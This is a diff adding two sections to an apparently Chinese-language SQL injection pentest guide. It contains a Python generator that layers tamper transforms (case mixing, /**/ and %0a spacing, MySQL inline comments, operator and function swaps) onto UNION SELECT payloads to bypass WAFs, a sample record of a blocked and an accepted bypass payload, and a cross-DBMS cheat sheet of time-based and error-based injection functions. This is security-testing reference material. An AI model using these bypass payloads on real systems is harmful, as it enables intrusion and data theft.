@@ -167,6 +167,71 @@ for p in mutate_sql_keyword("1 UNION SELECT 1,database(),3"):
 
 记录绕过矩阵时保留“被拦截 payload”和“通过 payload”的最小差异，例如只把空格换成 `/**/` 就通过，就不要再叠十种编码。
 
+### 1.7 Tamper 组合器
+
+WAF 绕过不是 payload 数量越多越好，而是找到“最小变形”。下面的组合器按层生成变体，并给每个变体打上来源标签，便于回填 evidence。
+
+```python
+# sqli_tamper_composer.py — 分层 tamper 生成器
+from itertools import product
+
+def t_case(s): return s.replace("UNION", "UnIoN").replace("SELECT", "SeLeCt").replace("AND", "AnD")
+def t_comment(s): return s.replace(" ", "/**/")
+def t_newline(s): return s.replace(" ", "%0a")
+def t_inline(s): return s.replace("SELECT", "/*!50000SELECT*/").replace("UNION", "/*!50000UNION*/")
+def t_operator(s): return s.replace(" AND ", " && ").replace(" OR ", " || ")
+def t_func(s): return s.replace("database()", "schema()").replace("substr(", "mid(")
+
+LAYERS = {
+    "token_case": [lambda s: s, t_case],
+    "space": [lambda s: s, t_comment, t_newline],
+    "mysql_inline": [lambda s: s, t_inline],
+    "operator": [lambda s: s, t_operator],
+    "function": [lambda s: s, t_func],
+}
+
+def compose_tampers(payload, max_layers=3):
+    names = list(LAYERS)
+    seen = {payload}
+    for chosen in product(*[LAYERS[n] for n in names]):
+        used = [names[i] for i, fn in enumerate(chosen) if fn(payload) != payload]
+        if len(used) > max_layers:
+            continue
+        out = payload
+        for fn in chosen:
+            out = fn(out)
+        if out not in seen:
+            seen.add(out)
+            yield {"payload": out, "layers": used}
+
+for item in compose_tampers("1 UNION SELECT 1,database(),3 AND 1=1-- "):
+    print(item["layers"], item["payload"])
+```
+
+绕过记录格式：
+
+```json
+{
+  "blocked": "1 UNION SELECT 1,database(),3-- ",
+  "accepted": "1/**/UnIoN/**/SeLeCt/**/1,schema(),3--/**/",
+  "changed_layers": ["token_case", "space", "function"],
+  "waf_signal": {"status": 403, "body_hash": "a13f..."},
+  "db_signal": {"status": 200, "marker": "current schema echoed"}
+}
+```
+
+### 1.8 DBMS 方言差异速查
+
+| 语义 | MySQL | PostgreSQL | MSSQL | SQLite | Oracle |
+|---|---|---|---|---|---|
+| 字符串截取 | `substr(s,p,1)` | `substr(s,p,1)` | `substring(s,p,1)` | `substr(s,p,1)` | `substr(s,p,1)` |
+| ASCII | `ascii(c)` | `ascii(c)` | `ascii(c)` | `unicode(c)` | `ascii(c)` |
+| 长度 | `length(s)` | `length(s)` | `len(s)` | `length(s)` | `length(s)` |
+| 拼接 | `concat(a,b)` | `a||b` | `a+b` | `a||b` | `a||b` |
+| 单行限制 | `LIMIT 1 OFFSET n` | `LIMIT 1 OFFSET n` | `OFFSET n ROWS FETCH NEXT 1 ROWS ONLY` | `LIMIT 1 OFFSET n` | `ROWNUM` / `FETCH FIRST` |
+| 时间 | `sleep(n)` | `pg_sleep(n)` | `WAITFOR DELAY` | heavy query | `DBMS_PIPE.RECEIVE_MESSAGE` |
+| 报错 | `updatexml/extractvalue` | `CAST(x AS INT)` | `CONVERT(INT,x)` | `json_extract`/类型错误 | `UTL_INADDR`/类型转换 |
+
 ## 2. 二阶 SQL 注入
 
 ### 2.1 原理
